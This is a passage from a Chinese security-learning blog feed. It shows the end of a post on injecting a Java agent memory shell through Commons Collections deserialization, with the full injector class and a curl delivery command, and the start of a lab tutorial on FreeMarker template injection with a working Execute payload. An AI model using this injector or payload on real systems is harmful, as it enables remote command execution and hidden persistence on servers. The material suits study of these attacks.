<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751507442436-6e40d767-2553-46c6-a3b3-311b5f5bd966.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751507442436-6e40d767-2553-46c6-a3b3-311b5f5bd966.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接下来我们尝试通过CC反序列化进行注入Agent内存马，首先编译下面这个Test类为Test.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            java.lang.<span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;E:\\Tools\\ysoserial\\agent.jar&quot;</span>;</span><br><span class="line">            java.io.<span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>,<span class="string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">            java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line">            java.net.<span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;url&#125;);</span><br><span class="line">            Class<span class="comment">/*&lt;?&gt;*/</span> MyVirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Class<span class="comment">/*&lt;?&gt;*/</span> MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">listMethod</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;list&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            java.util.List<span class="comment">/*&lt;Object&gt;*/</span> list = (java.util.List<span class="comment">/*&lt;Object&gt;*/</span>) listMethod.invoke(MyVirtualMachine,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Running JVM list ...&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">displayName</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;displayName&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                java.lang.<span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (java.lang.String) displayName.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                <span class="comment">// 列出当前有哪些 JVM 进程在运行</span></span><br><span class="line">                <span class="comment">// 这里的 if 条件根据实际情况进行更改</span></span><br><span class="line">                <span class="keyword">if</span> (name.contains(<span class="string">&quot;com.spring1.Spring1Application&quot;</span>))&#123;</span><br><span class="line">                    <span class="comment">// 获取对应进程的 pid 号</span></span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getId</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;id&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> (java.lang.String) getId.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot;id &gt;&gt;&gt; &quot;</span> + id);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">attach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">Object</span> <span class="variable">vm</span> <span class="operator">=</span> attach.invoke(o,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">loadAgent</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    loadAgent.invoke(vm,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;path&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">detach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    detach.invoke(vm,<span class="literal">null</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot;Agent.jar Inject Success !!&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用最近新学习的JavaChains工具进行生成payload，这里使用CC3.2.1动态加载字节码的方式将Agent内存马注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751507886039-acf4769f-caa8-44e2-a52a-b4ac6255f649.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751507886039-acf4769f-caa8-44e2-a52a-b4ac6255f649.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>将我们编译生成的Test.class文件上传上去</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751508044311-9ca93533-6d25-4058-9e64-66cc57ec935d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751508044311-9ca93533-6d25-4058-9e64-66cc57ec935d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后生成并下载Payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751508079745-2d28edd5-54b5-417b-953f-eb265d8ee748.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751508079745-2d28edd5-54b5-417b-953f-eb265d8ee748.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后使用curl语句将序列化数据打过去</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -v <span class="string">&quot;http://localhost:8080/cc&quot;</span> --data-binary <span class="string">&quot;@./test.ser&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到输入了 【注入成功】，说明我们的Agent内存马已经成功注入<br><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751508233741-29884653-8b14-49bc-bc3b-6d2f03d3cfc3.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751508233741-29884653-8b14-49bc-bc3b-6d2f03d3cfc3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>传入cmd参数后，可以看到成功的执行了命令</p>
<p>但是由于doFilter不只会执行一次，而是执行多次</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751508369459-96c2f690-03b2-46eb-8b20-acda7f46e0e9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751508369459-96c2f690-03b2-46eb-8b20-acda7f46e0e9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="Lr95n">小结</h2>

<p>agent内存马的实现形式也是在打Tomcat内存马。他的实现是通过遍历所有的JVM进程，然后向 进程中注入对应的Agent类。</p>
<h3 id="v4Ylt">比较</h3>

<p>agent内存马与filter内存马相比，会多一步将我们的agent.jar上传到目标上，利用代码将agent.jar进行注入，注入后就可以删除agent.jar</p>
<p>agent内存马相比于filter这些内存马更难查杀</p>
<h3 id="JJT7T">问题</h3>

<p>跟着师傅门的文章看，有些情况下注入agent内存马后网站会崩掉，可能的原因是虚拟内存不足</p>
<p>另一个方面的话就是在关键类寻找不对等的情况下，也会将网站打崩</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>memShell</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中的模板注入</title>
    <url>/2025/07/31/Java%E4%B8%AD%E7%9A%84%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="KKHyE">Java中的模板注入</h1>
<h2 id="qYrMv">前言</h2>

<p>最近在审计系统的时候，复现一个SSTI模板注入的漏洞，感觉SSTI的危害程度挺高的，因为感觉不是很了解原理，所以详细来学习一下SSTI漏洞</p>
<h2 id="NzTM6">模板注入漏洞</h2>

<p>SSTI（服务器端模板注入），在模板引擎解析模板时，因为代码实现的不严谨，可以将恶意代码注入到模板中，从而达到执行任意代码的功能。</p>
<p>Java中常用的模板有三个：FreeMarker，Thymeleaf，Velocity。</p>
<h3 id="AUZdp">FreeMarker</h3>

<p>FreeMarker 是一款Java语言编写的模板引擎，它是一种基于模板和程序动态生成的数据，动态生成输出文本（HTML网页，电子邮件，配置文件，源代码等）的通用工具。它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753766623347-b88679ea-1b94-4440-9c13-eea5f21b30ed.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753766623347-b88679ea-1b94-4440-9c13-eea5f21b30ed.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="WKYHX">FreeMarker基础</h4>
<h5 id="py830">总体结构</h5>

<p>FreeMarker模板文件主要有以下四个部分构成：</p>
<ol>
<li>文本：直接输出的地方</li>
<li>注释：使用<code>&lt;#-- ... --&gt;</code>格式作为注释，里面的内容不会输出</li>
<li>插值：<code>$&#123;&#125;</code>或<code>#&#123;&#125;</code>格式的部分，类似于占位符</li>
<li>FTL指令：FTL标签和HTML标签很相似，但是它们却是给FreeMarker的指示， 而且不会打印在输 出内容中</li>
</ol>
<h5 id="SbVAT">插值</h5>

<p>插值也叫Interpolation，即<code>$&#123;&#125;</code>或<code>#&#123;&#125;</code>格式的部分，将使用数据模型中的部分替代输出（里面的表达式可以是所有种类的表达式）</p>
<p>插值只可以在两种位置使用：</p>
<ul>
<li>文本区：<code>&lt;h1&gt;Hello $&#123;name&#125;&lt;/h1&gt;</code></li>
<li>字符串表达式：<code>&lt;#include &quot;/footer/$&#123;comppany&#125;.html&quot;&gt;</code></li>
</ul>
<p>以下面这个<code>.ftl</code>文件为例，<code>$&#123;name&#125;</code>的数据就会从传参中拿，一般情况下对应通过<code>addAttribute</code>中传入的name参数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello $&#123;name&#125;!<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;/css/main.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;hello-title&quot;</span>&gt;</span>Hello $&#123;name&#125;!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/js/main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="h28HM">内建函数</h5>

<p>在FreeMarker中自带着很多的内建函数，在这些内建函数中，我们只关注一些相关危险函数：<code>api</code>、<code>new</code></p>
<h6 id="anA3U">api内建函数</h6>

<p><code>value?api</code>提供了对value的API（通常为JavaAPI）的访问，例如：</p>
<ul>
<li>value?api?someJavaMethod</li>
<li>value?api.someBeanProperty</li>
</ul>
<p>只说很难理解，这里举一个例子：</p>
<p>当有一个Map放入数据模型时，模板中的<code>myMap.myMethod</code>基本上翻译成了<code>((Method) myMap.get(&quot;myMethod&quot;)).invoke(...) </code>，因此我们不能调用<code>myMethod</code>。而<code>myMap?api.myMethod()</code>，就基本与<code>myMap.myMethod()</code>等价</p>
<p><strong>PS</strong>：api_builtin_enabled为true时才可使用api函数，而该配置在2.3.22版本之后默认为false。</p>
<h6 id="GkmNT">new内建函数</h6>

<p>创建任意实现了TemplateModel接口的Java对象，同时在使用new的时候，还能够执行没有实现该接口类的静态初始化块。</p>
<p>在FreeMarker模板注入漏洞中，我们常用的有以下这两个类：</p>
<ul>
<li>freemarker.template.utility.JythonRuntime</li>
<li>freemarker.template.utility.Execute</li>
</ul>
<p>在<code>?</code>的左边可以指定一个字符串，为<code>TemplateModel</code>的全限定类名，使用方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;#assign word_wrapp &quot;com.acmee.freemarker.WordWrapperDirective&quot;&gt;new()&gt;</span><br><span class="line">&lt;#assign word_wrapp_narrow =&quot;com.acmee.freemarker.WordWrapperDirective&quot;&gt;new(40)&gt;</span><br></pre></td></tr></table></figure>

<h4 id="YlT3H">FreeMarker SSTI</h4>

<p>SSTI的漏洞成因都是模板引擎的渲染导致的，想让Web服务器将HTML语句渲染为模板引擎，那么就需要现有HTML语句。</p>
<p>那么想将HTML传输到服务器上，有两种方法：</p>
<ul>
<li>文件上传HTML</li>
<li>系统自带模板编辑功能</li>
</ul>
<h5 id="PEFTn">环境搭建</h5>

<p>环境搭建写的好麻烦呀…</p>
<p>在IDEA中创建SpringBoot项目</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753769046242-555104a9-1ec2-4c3f-be32-e43e47b75f81.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753769046242-555104a9-1ec2-4c3f-be32-e43e47b75f81.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>选择导入SpringWeb和Freemarker依赖</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753769151230-a5d712e3-4a93-4283-8e9b-55858b149a4e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753769151230-a5d712e3-4a93-4283-8e9b-55858b149a4e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后在<code>/src/main/resources/application.properties</code>文件中加下如下配置（端口想改哪里改哪里）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server.port=8888</span><br><span class="line"></span><br><span class="line"># 模板后缀名</span><br><span class="line">spring.freemarker.suffix=.ftl</span><br><span class="line"># 文档类型</span><br><span class="line">spring.freemarker.content-type=text/html</span><br><span class="line"># 页面编码</span><br><span class="line">spring.freemarker.charset=UTF-8</span><br><span class="line"># 页面缓存</span><br><span class="line">spring.freemarker.cache=false</span><br><span class="line"># 模板路径</span><br><span class="line">spring.freemarker.template-loader-path=classpath:/templates/</span><br></pre></td></tr></table></figure>

<p>在<code>/src/main/resources/templates</code>目录下新建一个名为<code>index.ftl</code>的文件，内容如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>FreeMarkerdemo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>$&#123;user.id&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>$&#123;user.name&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>继续编写Controller</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.freemarker.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.ModelMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FreemarkerController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/freemarker/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fmIndex</span><span class="params">(ModelMap modelMap)</span> &#123;</span><br><span class="line">        Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;88&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;CurlySean&quot;</span>);</span><br><span class="line">        <span class="comment">//给模板添加上面的属性值</span></span><br><span class="line">        modelMap.addAttribute(<span class="string">&quot;user&quot;</span>, map);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动项目即可，访问<code>http://127.0.0.1:8888/freemarker/index</code>，环境搭建成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770047888-9b74b6e1-064b-4331-8079-12449f447784.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770047888-9b74b6e1-064b-4331-8079-12449f447784.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="rFwHa">漏洞复现</h5>

<p>在FreeMarker中SSTI，需要我们将paylaod插入到<code>.ftl</code>模板中，从个人触发漏洞，paylaod如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;Calc&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770248879-240391ca-2e3c-4d2c-b02b-8faeece70c88.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770248879-240391ca-2e3c-4d2c-b02b-8faeece70c88.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>重启后访问，可以看到成功弹出计算器</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770333235-9c63b57b-4554-49f1-9b8a-ff08e1e26a0c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770333235-9c63b57b-4554-49f1-9b8a-ff08e1e26a0c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="USVve">漏洞分析</h5>
我们要分析的时MVC的思维，如何走到最终的危险类`freemarker.template.utility.Execute`中的

<p>在<code>org.springframework.web.servlet.view.UrlBasedViewResolver#createView</code>处下一个断点，开始我们的调试之旅</p>
<p>这里viewName，应该就是我们的<code>return &quot;index&quot;;</code>处，中间的判断都会跳过，我们继续跟进<code>super.create.createView(viewName,locale)</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770984182-f2f17327-4230-4ad9-98ae-55575e66eced.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770984182-f2f17327-4230-4ad9-98ae-55575e66eced.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>进一步跟进<code>loadView</code>以及<code>buildView</code>，先create一个View试图，再load进来，最后build即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772889191-227a528f-8b03-4b70-b4f0-8edd8bb82271.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772889191-227a528f-8b03-4b70-b4f0-8edd8bb82271.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772904081-8ba615c8-b5eb-44ca-b135-8446a5d966e7.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772904081-8ba615c8-b5eb-44ca-b135-8446a5d966e7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772927751-0624ffd6-c5b0-4846-89f3-93354b2390d2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772927751-0624ffd6-c5b0-4846-89f3-93354b2390d2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进到最后<code>buildView</code>方法中，先看一下<code>this.instantiateView</code>方法，该方法new了一个<code>FreeMarkerView</code>类，然后进行了一些基础的赋值，将View Build了出来</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772981263-3d637877-a197-4a7e-86ee-91bd2b2d3dc3.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772981263-3d637877-a197-4a7e-86ee-91bd2b2d3dc3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773028357-67369d8b-d688-4d05-9d13-93a2553ea79d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773028357-67369d8b-d688-4d05-9d13-93a2553ea79d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>回到<code>loadView</code>方法，<code>loadView</code>方法调用了<code>view.checkResource</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773172688-b45f852b-1385-47f3-8fd2-e537910ed578.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773172688-b45f852b-1385-47f3-8fd2-e537910ed578.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>view.checkResource</code>，在这个方法中做了两件事情：</p>
<ol>
<li>获取URL，判断URL是否为空</li>
<li>获取Template，准备开始模板引擎的渲染</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773228124-5f413a34-a761-40bf-9ff4-4d98da44dd4a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773228124-5f413a34-a761-40bf-9ff4-4d98da44dd4a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>获取URL没什么好说的，返回的url为<code>index.ftl</code>，层层跟进<code>this.getTemplate</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773497264-5e0b265c-1f63-4aa1-83f3-d6d48f257c0b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773497264-5e0b265c-1f63-4aa1-83f3-d6d48f257c0b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>首先做了一些参数的判断，然后调用<code>this.cache.getTemplate</code>，从cache中获取template（在设置模板时，会将其存储到cache中）</p>
<p>继续跟进<code>this.getTemplateInternal</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773646327-a14eebd5-15c2-4c6c-8c1f-6eece1b41326.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773646327-a14eebd5-15c2-4c6c-8c1f-6eece1b41326.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>前面做了一些判断，跟进<code>lookupTemplate</code>方法中，再跟进<code>this.templateLookupStrategy.lookup</code>，以及<code>lookupWithLocalizedThenAcquisitionStrategy</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773788601-3b4dc30e-f1a2-40f7-a229-e3bc6a39cade.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773788601-3b4dc30e-f1a2-40f7-a229-e3bc6a39cade.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在<code>lookupWithLocalizedThenAcquisitionStrategy</code>中，就是真正寻找文件的地方了</p>
<p>while之前，将文件名以<code>.</code>为截断截取文件名和文件后缀</p>
